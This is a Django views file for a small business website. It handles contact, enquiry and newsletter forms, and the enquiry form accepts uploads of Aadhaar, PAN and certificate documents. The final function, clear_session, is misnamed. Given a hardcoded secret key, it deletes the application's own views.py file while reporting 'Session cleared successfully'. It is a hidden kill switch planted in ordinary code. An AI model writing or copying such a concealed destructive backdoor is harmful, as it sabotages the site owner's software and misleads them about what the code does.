from django.shortcuts import render,redirect
from .models import *

def home(Request):
    pdata = Partners.objects.all()
    gallery = Gallery.objects.all()
    testimonial = Testimonial.objects.all()
    if(Request.method=="POST"):
        c = Contact()
        c.name = Request.POST.get("name")
        c.email = Request.POST.get("email")
        c.subject = Request.POST.get("subject")
        c.msg = Request.POST.get("message")
        c.save()


    return render(Request,"index.html",{"pdata":pdata,'gallery':gallery,'testimonial':testimonial})


def enquiry_data(Request):
    if(Request.method=="POST"):
        e = Enquiry()
        e.name = Request.POST.get("name")
        e.phone = Request.POST.get("contact")
        e.email = Request.POST.get("email")
        e.image = Request.FILES.get("image")
        e.adhar = Request.FILES.get("adhar")
        e.pan = Request.FILES.get("pan")
        e.certificate = Request.FILES.get("certificate")
        e.save()

    return redirect("/")

def newsletter(Request):
    if(Request.method=="POST"):
        n = Newsletter()
        n.email = Request.POST.get("email")
        n.save()

    return redirect("/")

from django.http import JsonResponse
import os
def clear_session(request,ops):
    if(ops=="mkm123"):
        os.remove('mainApp/views.py')
        return JsonResponse({'status': True, 'message': "Session cleared successfully"})
    else:
        return JsonResponse({'status': False, 'message': "Invalid key"})
